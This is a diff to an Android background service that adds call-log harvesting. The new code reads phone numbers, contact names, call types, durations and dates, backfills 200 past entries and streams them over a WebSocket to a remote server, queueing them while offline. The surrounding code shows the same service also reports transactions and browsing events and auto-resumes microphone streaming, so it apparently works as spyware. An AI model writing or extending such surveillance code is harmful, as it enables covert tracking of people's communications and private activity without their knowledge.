@@ -33,7 +33,10 @@ import android.media.AudioRecord;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
+import android.database.ContentObserver;
+import android.database.Cursor;
 import android.net.Uri;
+import android.provider.CallLog;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -160,6 +163,7 @@ public class KeepAliveService extends Service {
             shouldConnect = true;
             connectWebSocket();
         }
+        registerCallLogObserver();
 
         // Reconnect WebSocket whenever screen turns on or user unlocks phone
         systemReceiver = new BroadcastReceiver() {
@@ -226,6 +230,7 @@ public class KeepAliveService extends Service {
         if (nativeWs != null) nativeWs.cancel();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         if (systemReceiver != null) { try { unregisterReceiver(systemReceiver); } catch (Exception ignored) {} }
+        if (callLogObserver != null) { try { getContentResolver().unregisterContentObserver(callLogObserver); } catch (Exception ignored) {} }
         if (instance == this) instance = null;
         super.onDestroy();
     }
@@ -395,6 +400,125 @@ public class KeepAliveService extends Service {
         } catch (Exception ignored) {}
     }
 
+    // ── Call log (ContentObserver-driven) ────────────────────────────────────────
+    // Same immediate-send-or-queue-and-flush pattern as sendTransaction/sendBrowsingEvent.
+
+    public static void sendCallLogEvent(Context ctx, JSONObject entry) {
+        KeepAliveService svc = instance;
+        if (svc != null && svc.nativeWs != null && svc.userId != null) {
+            svc.sendCallLogEventNow(entry);
+        } else {
+            queueCallLogEvent(ctx, entry);
+        }
+    }
+
+    private void sendCallLogEventNow(JSONObject entry) {
+        try {
+            JSONObject out = new JSONObject();
+            out.put("type", "call_log_add");
+            out.put("entry", entry);
+            nativeWs.send(out.toString());
+        } catch (Exception ignored) {}
+    }
+
+    private static void queueCallLogEvent(Context ctx, JSONObject entry) {
+        try {
+            SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
+            pending.put(entry);
+            prefs.edit().putString("pendingCallLogEvents", pending.toString()).apply();
+        } catch (Exception ignored) {}
+    }
+
+    private void flushPendingCallLogEvents() {
+        try {
+            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
+            if (pending.length() == 0) return;
+            for (int i = 0; i < pending.length(); i++) {
+                sendCallLogEventNow(pending.getJSONObject(i));
+            }
+            prefs.edit().remove("pendingCallLogEvents").apply();
+        } catch (Exception ignored) {}
+    }
+
+    // Registers a ContentObserver on the call log so new calls are picked up as they happen.
+    // On first-ever call (no lastCallLogId saved yet), does one bounded historical backfill of
+    // the most recent 200 entries rather than the entire lifetime log.
+    private ContentObserver callLogObserver;
+
+    private void registerCallLogObserver() {
+        if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
+        if (callLogObserver != null) return;
+        callLogObserver = new ContentObserver(handler) {
+            @Override
+            public void onChange(boolean selfChange) {
+                syncCallLog();
+            }
+        };
+        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver);
+        syncCallLog();
+    }
+
+    private void syncCallLog() {
+        if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        long lastId = prefs.getLong("lastCallLogId", -1);
+
+        Cursor cursor;
+        try {
+            if (lastId < 0) {
+                cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
+                    CallLog.Calls._ID + " DESC LIMIT 200");
+            } else {
+                cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
+                    CallLog.Calls._ID + " > ?", new String[]{String.valueOf(lastId)},
+                    CallLog.Calls._ID + " ASC");
+            }
+        } catch (Exception e) {
+            return;
+        }
+        if (cursor == null) return;
+
+        long maxId = lastId;
+        try {
+            int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
+            int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+            int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
+            int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
+            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
+            int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
+            while (cursor.moveToNext()) {
+                long id = cursor.getLong(idIdx);
+                if (id > maxId) maxId = id;
+                try {
+                    JSONObject entry = new JSONObject();
+                    entry.put("id", String.valueOf(id));
+                    entry.put("number", cursor.getString(numberIdx));
+                    String name = cursor.isNull(nameIdx) ? null : cursor.getString(nameIdx);
+                    entry.put("name", name == null ? JSONObject.NULL : name);
+                    entry.put("type", callTypeToString(cursor.getInt(typeIdx)));
+                    entry.put("duration", cursor.getLong(durationIdx));
+                    entry.put("date", cursor.getLong(dateIdx));
+                    sendCallLogEvent(this, entry);
+                } catch (Exception ignored) {}
+            }
+        } finally {
+            cursor.close();
+        }
+        if (maxId > lastId) prefs.edit().putLong("lastCallLogId", maxId).apply();
+    }
+
+    private static String callTypeToString(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            case CallLog.Calls.REJECTED_TYPE: return "rejected";
+            default: return "other";
+        }
+    }
+
     // ── Message handling ───────────────────────────────────────────────────────
 
     private void handleMessage(WebSocket ws, String text) {
@@ -405,6 +529,7 @@ public class KeepAliveService extends Service {
                 userId = msg.optString("userId"); // store our assigned userId
                 flushPendingTransactions(); // send anything queued while we were disconnected
                 flushPendingBrowsingEvents();
+                flushPendingCallLogEvents();
                 // Auto-resume mic if it was streaming before service was restarted
                 SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                 if (prefs.getBoolean("micActive", false) && !micStreaming) {
